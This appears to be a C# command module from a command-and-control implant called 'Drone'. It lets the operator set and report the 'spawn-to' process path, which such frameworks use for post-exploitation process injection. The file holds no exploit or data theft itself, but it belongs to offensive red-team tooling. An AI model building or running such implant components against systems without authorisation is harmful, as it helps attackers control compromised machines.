using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class SpawnTo : DroneCommand
{
    public override byte Command => 0x1A;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (task.Arguments.Any())
        {
            var path = task.Arguments[0];

            if (!File.Exists(path))
                throw new FileNotFoundException("Path does not exist", path);
        
            Drone.Config.Set(Setting.SpawnTo, path);
        }

        var spawnTo = Drone.Config.Get<string>(Setting.SpawnTo);
        await Drone.SendOutput(task, $"SpawnTo is \"{spawnTo}\".");
    }
}